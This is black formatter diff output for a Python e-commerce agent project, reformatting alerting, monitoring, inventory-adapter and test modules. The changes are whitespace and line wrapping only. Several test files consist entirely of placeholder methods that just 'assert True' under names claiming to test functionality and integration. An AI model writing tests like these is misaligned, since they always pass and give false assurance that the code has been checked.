-            labels_str = ",".join(f"{k}={v}" for k, v in sorted(metric["labels"].items()))
+            labels_str = ",".join(
+                f"{k}={v}" for k, v in sorted(metric["labels"].items())
+            )
             key_parts.append(labels_str)
-        
+
         return ":".join(key_parts)
-    
-    async def _create_or_update_alert(self, rule: AlertRule, metric: Dict[str, Any], value: float) -> None:
+
+    async def _create_or_update_alert(
+        self, rule: AlertRule, metric: Dict[str, Any], value: float
+    ) -> None:
         """
         Create or update an alert.
-        
+
         Args:
             rule: Alert rule
             metric: Metric data
             value: Current metric value
         """
         try:
             # Get metric key
             metric_key = self._get_metric_key(rule, metric)
-            
+
             # Create alert ID
             alert_id = f"{rule.id}:{metric_key}"
-            
+
             # Check if alert already exists
             if alert_id in self.alerts:
                 # Update existing alert
                 alert = self.alerts[alert_id]
                 alert.value = value
                 alert.updated_at = datetime.utcnow()
-                
+
                 # Check if we should send another notification
                 if self.notification_service and rule.notification_channels:
                     # Check cooldown
-                    if alert.last_notification_time is None or (
-                        datetime.utcnow() - alert.last_notification_time
-                    ).total_seconds() >= rule.cooldown:
+                    if (
+                        alert.last_notification_time is None
+                        or (
+                            datetime.utcnow() - alert.last_notification_time
+                        ).total_seconds()
+                        >= rule.cooldown
+                    ):
                         # Send notification
                         await self._send_alert_notification(alert)
             else:
                 # Create new alert
                 alert = Alert(
@@ -379,110 +415,114 @@
                     threshold=rule.threshold,
                     comparison=rule.comparison,
                     severity=rule.severity,
                     notification_channels=rule.notification_channels,
                 )
-                
+
                 # Add to active alerts
                 self.alerts[alert_id] = alert
-                
+
                 # Send notification
                 if self.notification_service and rule.notification_channels:
                     await self._send_alert_notification(alert)
-                
+
                 logger.info("Created alert: %s", alert_id)
         except Exception as e:
             logger.error("Error creating or updating alert: %s", e)
-    
+
     async def _resolve_alert(self, alert_id: str, value: float) -> None:
         """
         Resolve an alert.
-        
+
         Args:
             alert_id: Alert ID
             value: Current metric value
         """
         try:
             # Get alert
             alert = self.alerts.get(alert_id)
             if not alert:
                 return
-            
+
             # Update alert
             alert.status = AlertStatus.RESOLVED
             alert.resolved_at = datetime.utcnow()
             alert.value = value
             alert.updated_at = datetime.utcnow()
-            
+
             # Send resolution notification
             if self.notification_service and alert.notification_channels:
                 await self._send_alert_resolution_notification(alert)
-            
+
             # Move to history
             self.alert_history.append(alert)
-            
+
             # Remove from active alerts
             del self.alerts[alert_id]
-            
+
             logger.info("Resolved alert: %s", alert_id)
         except Exception as e:
             logger.error("Error resolving alert: %s", e)
-    
-    async def _check_resolved_alerts(self, latest_metrics: List[Dict[str, Any]]) -> None:
+
+    async def _check_resolved_alerts(
+        self, latest_metrics: List[Dict[str, Any]]
+    ) -> None:
         """
         Check if any active alerts should be resolved.
-        
+
         Args:
             latest_metrics: Latest metrics
         """
         try:
             # Build a map of metric keys to values
             metric_values = {}
             for metric in latest_metrics:
                 metric_key = f"{metric['name']}:{metric.get('component', '')}:{','.join(f'{k}={v}' for k, v in sorted(metric.get('labels', {}).items()))}"
                 metric_values[metric_key] = metric["value"]
-            
+
             # Check each active alert
             for alert_id, alert in list(self.alerts.items()):
                 # Get rule
                 rule = self.rules.get(alert.rule_id)
                 if not rule:
                     # Rule no longer exists, resolve alert
                     await self._resolve_alert(alert_id, alert.value)
                     continue
-                
+
                 # Build metric key
                 metric_key = f"{alert.metric_name}:{alert.component or ''}:{','.join(f'{k}={v}' for k, v in sorted(alert.labels.items()))}"
-                
+
                 # Check if metric exists
                 if metric_key not in metric_values:
                     # Metric no longer exists, keep alert active
                     continue
-                
+
                 # Get current value
                 value = metric_values[metric_key]
-                
+
                 # Check threshold
-                threshold_exceeded = self._check_threshold(value, rule.threshold, rule.comparison)
-                
+                threshold_exceeded = self._check_threshold(
+                    value, rule.threshold, rule.comparison
+                )
+
                 if not threshold_exceeded:
                     # Threshold no longer exceeded, resolve alert
                     await self._resolve_alert(alert_id, value)
         except Exception as e:
             logger.error("Error checking resolved alerts: %s", e)
-    
+
     async def _send_alert_notification(self, alert: Alert) -> None:
         """
         Send an alert notification.
-        
+
         Args:
             alert: Alert to send notification for
         """
         try:
             if not self.notification_service:
                 return
-            
+
             # Build notification data
             data = {
                 "alert_id": alert.id,
                 "name": alert.name,
                 "description": alert.description,
@@ -495,40 +535,40 @@
                 "severity": alert.severity,
                 "status": alert.status,
                 "created_at": alert.created_at.isoformat(),
                 "updated_at": alert.updated_at.isoformat(),
             }
-            
+
             # Send notification
             for channel in alert.notification_channels:
                 await self.notification_service.send_notification(
                     user_id="system",
                     template_id="alert",
                     category="alert",
                     data=data,
                     delivery_methods={channel},
                 )
-            
+
             # Update alert
             alert.last_notification_time = datetime.utcnow()
             alert.notification_count += 1
-            
+
             logger.info("Sent alert notification: %s", alert.id)
         except Exception as e:
             logger.error("Error sending alert notification: %s", e)
-    
+
     async def _send_alert_resolution_notification(self, alert: Alert) -> None:
         """
         Send an alert resolution notification.
-        
+
         Args:
             alert: Alert to send notification for
         """
         try:
             if not self.notification_service:
                 return
-            
+
             # Build notification data
             data = {
                 "alert_id": alert.id,
                 "name": alert.name,
                 "description": alert.description,
@@ -540,99 +580,101 @@
                 "comparison": alert.comparison,
                 "severity": alert.severity,
                 "status": alert.status,
                 "created_at": alert.created_at.isoformat(),
                 "updated_at": alert.updated_at.isoformat(),
-                "resolved_at": alert.resolved_at.isoformat() if alert.resolved_at else None,
+                "resolved_at": (
+                    alert.resolved_at.isoformat() if alert.resolved_at else None
+                ),
             }
-            
+
             # Send notification
             for channel in alert.notification_channels:
                 await self.notification_service.send_notification(
                     user_id="system",
                     template_id="alert_resolved",
                     category="alert",
                     data=data,
                     delivery_methods={channel},
                 )
-            
+
             logger.info("Sent alert resolution notification: %s", alert.id)
         except Exception as e:
             logger.error("Error sending alert resolution notification: %s", e)
-    
+
     def add_rule(self, rule: AlertRule) -> None:
         """
         Add an alert rule.
-        
+
         Args:
             rule: Alert rule to add
         """
         self.rules[rule.id] = rule
         logger.info("Added alert rule: %s", rule.id)
-    
+
     def remove_rule(self, rule_id: str) -> bool:
         """
         Remove an alert rule.
-        
+
         Args:
             rule_id: ID of the rule to remove
-            
+
         Returns:
             True if the rule was removed, False otherwise
         """
         if rule_id in self.rules:
             del self.rules[rule_id]
             logger.info("Removed alert rule: %s", rule_id)
             return True
         return False
-    
+
     def get_rule(self, rule_id: str) -> Optional[AlertRule]:
         """
         Get an alert rule.
-        
+
         Args:
             rule_id: ID of the rule to get
-            
+
         Returns:
             Alert rule if found, None otherwise
         """
         return self.rules.get(rule_id)
-    
+
     def get_all_rules(self) -> Dict[str, AlertRule]:
         """
         Get all alert rules.
-        
+
         Returns:
             Dictionary of alert rules
         """
         return self.rules.copy()
-    
+
     def get_active_alerts(self) -> Dict[str, Alert]:
         """
         Get all active alerts.
-        
+
         Returns:
             Dictionary of active alerts
         """
         return self.alerts.copy()
-    
+
     def get_alert_history(self) -> List[Alert]:
         """
         Get alert history.
-        
+
         Returns:
             List of historical alerts
         """
         return self.alert_history.copy()
-    
+
     def acknowledge_alert(self, alert_id: str) -> bool:
         """
         Acknowledge an alert.
-        
+
         Args:
             alert_id: ID of the alert to acknowledge
-            
+
         Returns:
             True if the alert was acknowledged, False otherwise
         """
         if alert_id in self.alerts:
             alert = self.alerts[alert_id]
@@ -640,10 +682,10 @@
             alert.acknowledged_at = datetime.utcnow()
             alert.updated_at = datetime.utcnow()
             logger.info("Acknowledged alert: %s", alert_id)
             return True
         return False
-    
+
     def clear_alert_history(self) -> None:
         """Clear alert history."""
         self.alert_history.clear()
         logger.info("Cleared alert history")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerting.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/manager.py	2025-06-14 20:35:30.835840+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/manager.py	2025-06-19 04:04:07.837019+00:00
@@ -12,11 +12,14 @@
     AlertSeverity,
     AlertType,
     MetricType,
 )
 from fs_agt_clean.core.monitoring.alerts.notification_service import NotificationService
-from fs_agt_clean.core.monitoring.alerts.persistence import AlertStorage, SQLiteAlertStorage
+from fs_agt_clean.core.monitoring.alerts.persistence import (
+    AlertStorage,
+    SQLiteAlertStorage,
+)
 from fs_agt_clean.core.monitoring.alerts.validation import (
     AlertValidationError,
     validate_alert,
 )
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/persistence.py	2025-06-16 07:04:30.598767+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/persistence.py	2025-06-19 04:04:07.845071+00:00
@@ -7,17 +7,19 @@
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Protocol, Union
 
 try:
     import aiofiles
+
     AIOFILES_AVAILABLE = True
 except ImportError:
     AIOFILES_AVAILABLE = False
     aiofiles = None
 
 try:
     import aiosqlite
+
     AIOSQLITE_AVAILABLE = True
 except ImportError:
     AIOSQLITE_AVAILABLE = False
     aiosqlite = None
 
@@ -213,11 +215,13 @@
             config: Optional configuration dictionary.
         """
         super().__init__(config)
 
         if not AIOFILES_AVAILABLE:
-            raise ImportError("aiofiles is required for FileAlertStorage but not available")
+            raise ImportError(
+                "aiofiles is required for FileAlertStorage but not available"
+            )
 
         self.storage_path = Path(storage_path)
         self.max_file_size = max_file_size
         self.rotation_count = rotation_count
         self._ensure_storage_path()
@@ -452,11 +456,13 @@
             config: Optional configuration dictionary
         """
         super().__init__(config)
 
         if not AIOSQLITE_AVAILABLE:
-            raise ImportError("aiosqlite is required for SQLiteAlertStorage but not available")
+            raise ImportError(
+                "aiosqlite is required for SQLiteAlertStorage but not available"
+            )
 
         self.db_path = Path(db_path)
         self._db_initialized = False
 
     async def _ensure_database(self) -> None:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/persistence.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/test_metrics_service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/test_metrics_service.py	2025-06-19 04:04:08.152942+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestMetricsServiceService:
     """Test class for metrics_service service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/test_metrics_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/inventory_management/test_manager.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/inventory_management/test_manager.py	2025-06-19 04:04:08.265750+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestManagerService:
     """Test class for manager service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/inventory_management/test_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/test_service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/test_service.py	2025-06-19 04:04:08.292149+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
 class TestServiceAPIServices:
     """API/Services test class for service."""
 
     def test_import(self):
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/logistics/shippo/test_shippo_service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/logistics/shippo/test_shippo_service.py	2025-06-19 04:04:08.433923+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for shippo_service
 
 This module contains API/Services focused tests for the migrated shippo_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from shippo_service import *
+
 
 class TestShippoServiceAPIServices:
     """API/Services test class for shippo_service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/logistics/shippo/test_shippo_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/service.py	2025-06-19 04:04:08.677635+00:00
@@ -21,25 +21,25 @@
 
 
 class MonitoringService:
     """
     Service for monitoring system health and performance.
-    
+
     This class collects system metrics and stores them using the metrics service.
     """
-    
+
     def __init__(
         self,
         metrics_service: MetricsService,
         collection_interval: int = 60,  # 1 minute
         system_metrics_enabled: bool = True,
         process_metrics_enabled: bool = True,
         custom_metrics_enabled: bool = True,
     ):
         """
         Initialize the monitoring service.
-        
+
         Args:
             metrics_service: Metrics service for storing metrics
             collection_interval: Interval between metric collections in seconds
             system_metrics_enabled: Whether to collect system metrics
             process_metrics_enabled: Whether to collect process metrics
@@ -48,333 +48,333 @@
         self.metrics_service = metrics_service
         self.collection_interval = collection_interval
         self.system_metrics_enabled = system_metrics_enabled
         self.process_metrics_enabled = process_metrics_enabled
         self.custom_metrics_enabled = custom_metrics_enabled
-        
+
         self.is_running = False
         self.collection_task = None
         self.last_collection_time = None
-        
+
         # Process information
         self.process = psutil.Process()
         self.start_time = time.time()
-        
+
         # Custom metrics
         self.custom_metrics: Dict[str, float] = {}
-        
+
         logger.info("Monitoring service initialized")
-    
+
     async def start(self) -> None:
         """Start collecting metrics."""
         if self.is_running:
             logger.warning("Monitoring service is already running")
             return
-        
+
         self.is_running = True
         self.collection_task = asyncio.create_task(self._collect_metrics_loop())
         logger.info("Started monitoring service")
-    
+
     async def stop(self) -> None:
         """Stop collecting metrics."""
         if not self.is_running:
             logger.warning("Monitoring service is not running")
             return
-        
+
         self.is_running = False
         if self.collection_task:
             self.collection_task.cancel()
             try:
                 await self.collection_task
             except asyncio.CancelledError:
                 pass
             self.collection_task = None
-        
+
         logger.info("Stopped monitoring service")
-    
+
     async def _collect_metrics_loop(self) -> None:
         """Continuously collect metrics at the configured interval."""
         while self.is_running:
             try:
                 await self._collect_metrics()
                 self.last_collection_time = datetime.utcnow()
-                
+
                 # Sleep until next collection
                 await asyncio.sleep(self.collection_interval)
             except asyncio.CancelledError:
                 break
             except Exception as e:
                 logger.error("Error collecting metrics: %s", e)
                 await asyncio.sleep(10)  # Sleep for a short time before retrying
-    
+
     async def _collect_metrics(self) -> None:
         """Collect all metrics."""
         try:
             # Collect system metrics
             if self.system_metrics_enabled:
                 await self._collect_system_metrics()
-            
+
             # Collect process metrics
             if self.process_metrics_enabled:
                 await self._collect_process_metrics()
-            
+
             # Collect custom metrics
             if self.custom_metrics_enabled:
                 await self._collect_custom_metrics()
-            
+
             logger.debug("Collected metrics")
         except Exception as e:
             logger.error("Error collecting metrics: %s", e)
-    
+
     async def _collect_system_metrics(self) -> None:
         """Collect system metrics."""
         try:
             # CPU metrics
             cpu_percent = psutil.cpu_percent(interval=1)
             cpu_count = psutil.cpu_count()
-            
+
             await self.metrics_service.record_metric(
                 name="system.cpu.percent",
                 value=cpu_percent,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.cpu.count",
                 value=cpu_count,
                 component="system",
             )
-            
+
             # Memory metrics
             memory = psutil.virtual_memory()
-            
+
             await self.metrics_service.record_metric(
                 name="system.memory.total",
                 value=memory.total,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.memory.available",
                 value=memory.available,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.memory.used",
                 value=memory.used,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.memory.percent",
                 value=memory.percent,
                 component="system",
             )
-            
+
             # Disk metrics
             disk = psutil.disk_usage("/")
-            
+
             await self.metrics_service.record_metric(
                 name="system.disk.total",
                 value=disk.total,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.disk.used",
                 value=disk.used,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.disk.free",
                 value=disk.free,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.disk.percent",
                 value=disk.percent,
                 component="system",
             )
-            
+
             # Network metrics
             net_io = psutil.net_io_counters()
-            
+
             await self.metrics_service.record_metric(
                 name="system.network.bytes_sent",
                 value=net_io.bytes_sent,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.network.bytes_recv",
                 value=net_io.bytes_recv,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.network.packets_sent",
                 value=net_io.packets_sent,
                 component="system",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="system.network.packets_recv",
                 value=net_io.packets_recv,
                 component="system",
             )
-            
+
             # System uptime
             boot_time = psutil.boot_time()
             uptime = time.time() - boot_time
-            
+
             await self.metrics_service.record_metric(
                 name="system.uptime",
                 value=uptime,
                 component="system",
             )
-            
+
             logger.debug("Collected system metrics")
         except Exception as e:
             logger.error("Error collecting system metrics: %s", e)
-    
+
     async def _collect_process_metrics(self) -> None:
         """Collect process metrics."""
         try:
             # Process CPU metrics
             process_cpu_percent = self.process.cpu_percent(interval=1)
-            
+
             await self.metrics_service.record_metric(
                 name="process.cpu.percent",
                 value=process_cpu_percent,
                 component="process",
             )
-            
+
             # Process memory metrics
             process_memory = self.process.memory_info()
-            
+
             await self.metrics_service.record_metric(
                 name="process.memory.rss",
                 value=process_memory.rss,
                 component="process",
             )
-            
+
             await self.metrics_service.record_metric(
                 name="process.memory.vms",
                 value=process_memory.vms,
                 component="process",
             )
-            
+
             # Process threads
             process_threads = self.process.num_threads()
-            
+
             await self.metrics_service.record_metric(
                 name="process.threads",
                 value=process_threads,
                 component="process",
             )
-            
+
             # Process open files
             process_open_files = len(self.process.open_files())
-            
+
             await self.metrics_service.record_metric(
                 name="process.open_files",
                 value=process_open_files,
                 component="process",
             )
-            
+
             # Process connections
             process_connections = len(self.process.connections())
-            
+
             await self.metrics_service.record_metric(
                 name="process.connections",
                 value=process_connections,
                 component="process",
             )
-            
+
             # Process uptime
             process_uptime = time.time() - self.start_time
-            
+
             await self.metrics_service.record_metric(
                 name="process.uptime",
                 value=process_uptime,
                 component="process",
             )
-            
+
             logger.debug("Collected process metrics")
         except Exception as e:
             logger.error("Error collecting process metrics: %s", e)
-    
+
     async def _collect_custom_metrics(self) -> None:
         """Collect custom metrics."""
         try:
             # Record all custom metrics
             for name, value in self.custom_metrics.items():
                 await self.metrics_service.record_metric(
                     name=name,
                     value=value,
                     component="custom",
                 )
-            
+
             logger.debug("Collected custom metrics")
         except Exception as e:
             logger.error("Error collecting custom metrics: %s", e)
-    
+
     def set_custom_metric(self, name: str, value: float) -> None:
         """
         Set a custom metric.
-        
+
         Args:
             name: Metric name
             value: Metric value
         """
         self.custom_metrics[name] = value
-    
+
     def increment_custom_metric(self, name: str, value: float = 1.0) -> None:
         """
         Increment a custom metric.
-        
+
         Args:
             name: Metric name
             value: Value to increment by
         """
         if name not in self.custom_metrics:
             self.custom_metrics[name] = 0.0
-        
+
         self.custom_metrics[name] += value
-    
+
     def get_custom_metric(self, name: str) -> Optional[float]:
         """
         Get a custom metric.
-        
+
         Args:
             name: Metric name
-            
+
         Returns:
             Metric value if it exists, None otherwise
         """
         return self.custom_metrics.get(name)
-    
+
     def get_all_custom_metrics(self) -> Dict[str, float]:
         """
         Get all custom metrics.
-        
+
         Returns:
             Dictionary of custom metrics
         """
         return self.custom_metrics.copy()
-    
+
     def clear_custom_metrics(self) -> None:
         """Clear all custom metrics."""
         self.custom_metrics.clear()
-    
+
     def get_system_info(self) -> Dict[str, str]:
         """
         Get system information.
-        
+
         Returns:
             Dictionary of system information
         """
         return {
             "system": platform.system(),
@@ -384,24 +384,26 @@
             "machine": platform.machine(),
             "processor": platform.processor(),
             "python_version": platform.python_version(),
             "python_implementation": platform.python_implementation(),
         }
-    
+
     def get_process_info(self) -> Dict[str, Union[str, int, float]]:
         """
         Get process information.
-        
+
         Returns:
             Dictionary of process information
         """
         return {
             "pid": self.process.pid,
             "name": self.process.name(),
             "exe": self.process.exe(),
             "cwd": self.process.cwd(),
             "cmdline": " ".join(self.process.cmdline()),
-            "create_time": datetime.fromtimestamp(self.process.create_time()).isoformat(),
+            "create_time": datetime.fromtimestamp(
+                self.process.create_time()
+            ).isoformat(),
             "status": self.process.status(),
             "username": self.process.username(),
             "uptime": time.time() - self.start_time,
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/adapter.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/adapter.py	2025-06-19 04:04:08.700532+00:00
@@ -15,26 +15,30 @@
 logger = logging.getLogger(__name__)
 
 
 class InventoryServiceAdapter:
     """Adapter for inventory service that matches API route expectations."""
-    
+
     def __init__(self, database: Database):
         """Initialize the inventory service adapter."""
         self.database = database
-    
-    async def get_items(self, limit: int = 100, offset: int = 0) -> List[Dict[str, Any]]:
+
+    async def get_items(
+        self, limit: int = 100, offset: int = 0
+    ) -> List[Dict[str, Any]]:
         """Get all inventory items."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
-                items = await repository.find_by_criteria({}, limit=limit, offset=offset)
+                items = await repository.find_by_criteria(
+                    {}, limit=limit, offset=offset
+                )
                 return [repository._item_to_dict(item) for item in items]
         except Exception as e:
             logger.error(f"Error getting inventory items: {e}")
             return []
-    
+
     async def get_item_by_id(self, item_id: str) -> Optional[Dict[str, Any]]:
         """Get inventory item by ID."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
@@ -43,11 +47,11 @@
                     return repository._item_to_dict(item)
                 return None
         except Exception as e:
             logger.error(f"Error getting inventory item {item_id}: {e}")
             return None
-    
+
     async def get_item_by_sku(self, sku: str) -> Optional[Dict[str, Any]]:
         """Get inventory item by SKU."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
@@ -56,127 +60,148 @@
                     return repository._item_to_dict(item)
                 return None
         except Exception as e:
             logger.error(f"Error getting inventory item by SKU {sku}: {e}")
             return None
-    
+
     async def create_item(self, item_data: Dict[str, Any]) -> Dict[str, Any]:
         """Create a new inventory item."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
-                
+
                 # Check if SKU already exists
                 if "sku" in item_data:
                     existing = await repository.get_by_sku(item_data["sku"])
                     if existing:
-                        raise ValueError(f"Item with SKU {item_data['sku']} already exists")
-                
+                        raise ValueError(
+                            f"Item with SKU {item_data['sku']} already exists"
+                        )
+
                 # Set default values
                 item_data.setdefault("quantity", 0)
                 item_data.setdefault("is_active", True)
                 item_data.setdefault("created_by", "system")
-                
+
                 item = await repository.create_item(item_data)
                 return repository._item_to_dict(item)
         except Exception as e:
             logger.error(f"Error creating inventory item: {e}")
             raise
-    
-    async def update_item(self, item_id: str, item_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+
+    async def update_item(
+        self, item_id: str, item_data: Dict[str, Any]
+    ) -> Optional[Dict[str, Any]]:
         """Update an inventory item."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
-                
+
                 # Set updated_by if not provided
                 item_data.setdefault("updated_by", "system")
-                
+
                 item = await repository.update_item(int(item_id), item_data)
                 if item:
                     return repository._item_to_dict(item)
                 return None
         except Exception as e:
             logger.error(f"Error updating inventory item {item_id}: {e}")
             raise
-    
+
     async def delete_item(self, item_id: str) -> bool:
         """Delete an inventory item."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
                 return await repository.delete(int(item_id))
         except Exception as e:
             logger.error(f"Error deleting inventory item {item_id}: {e}")
             return False
-    
-    async def adjust_quantity(self, item_id: str, adjustment_data: Dict[str, Any]) -> bool:
+
+    async def adjust_quantity(
+        self, item_id: str, adjustment_data: Dict[str, Any]
+    ) -> bool:
         """Adjust inventory quantity."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
-                
+
                 quantity = adjustment_data.get("quantity", 0)
                 transaction_type = adjustment_data.get("transaction_type", "adjustment")
                 notes = adjustment_data.get("notes", "Manual adjustment")
-                
+
                 # Get current item to calculate new quantity
                 item = await repository.find_by_id(int(item_id))
                 if not item:
                     return False
-                
+
                 # Calculate new quantity based on adjustment type
                 if adjustment_data.get("adjustment_type") == "set":
                     new_quantity = quantity
                 else:
                     new_quantity = item.quantity + quantity
-                
+
                 # Ensure quantity doesn't go negative
                 new_quantity = max(0, new_quantity)
-                
+
                 return await repository.update_quantity(
-                    int(item_id), 
-                    new_quantity, 
-                    transaction_type, 
-                    notes
+                    int(item_id), new_quantity, transaction_type, notes
                 )
         except Exception as e:
             logger.error(f"Error adjusting inventory quantity for item {item_id}: {e}")
             return False
-    
+
     async def get_transactions(self, item_id: str) -> List[Dict[str, Any]]:
         """Get transactions for an inventory item."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
                 item = await repository.find_by_id(int(item_id))
                 if not item:
                     return []
-                
+
                 # Convert transactions to dictionaries
                 transactions = []
                 for transaction in item.transactions:
-                    transactions.append({
-                        "id": transaction.id,
-                        "item_id": transaction.item_id,
-                        "transaction_type": transaction.transaction_type,
-                        "quantity": transaction.quantity,
-                        "unit_price": float(transaction.unit_price) if transaction.unit_price else None,
-                        "total_amount": float(transaction.total_amount) if transaction.total_amount else None,
-                        "reference_id": transaction.reference_id,
-                        "reference_type": transaction.reference_type,
-                        "notes": transaction.notes,
-                        "transaction_date": transaction.transaction_date.isoformat() if transaction.transaction_date else None,
-                        "created_at": transaction.created_at.isoformat() if transaction.created_at else None,
-                        "created_by": transaction.created_by,
-                    })
-                
+                    transactions.append(
+                        {
+                            "id": transaction.id,
+                            "item_id": transaction.item_id,
+                            "transaction_type": transaction.transaction_type,
+                            "quantity": transaction.quantity,
+                            "unit_price": (
+                                float(transaction.unit_price)
+                                if transaction.unit_price
+                                else None
+                            ),
+                            "total_amount": (
+                                float(transaction.total_amount)
+                                if transaction.total_amount
+                                else None
+                            ),
+                            "reference_id": transaction.reference_id,
+                            "reference_type": transaction.reference_type,
+                            "notes": transaction.notes,
+                            "transaction_date": (
+                                transaction.transaction_date.isoformat()
+                                if transaction.transaction_date
+                                else None
+                            ),
+                            "created_at": (
+                                transaction.created_at.isoformat()
+                                if transaction.created_at
+                                else None
+                            ),
+                            "created_by": transaction.created_by,
+                        }
+                    )
+
                 return transactions
         except Exception as e:
             logger.error(f"Error getting transactions for item {item_id}: {e}")
             return []
-    
+
     async def search_items(self, query: str, limit: int = 100) -> List[Dict[str, Any]]:
         """Search inventory items."""
         try:
             async with self.database.get_session_context() as session:
                 repository = InventoryRepository(session)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/adapter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/amazon/test_service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/amazon/test_service.py	2025-06-19 04:04:08.956083+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for marketplace_amazon_service
 
 This module contains API/Services focused tests for the migrated marketplace_amazon_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
 class TestServiceAPIServices:
     """API/Services test class for service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
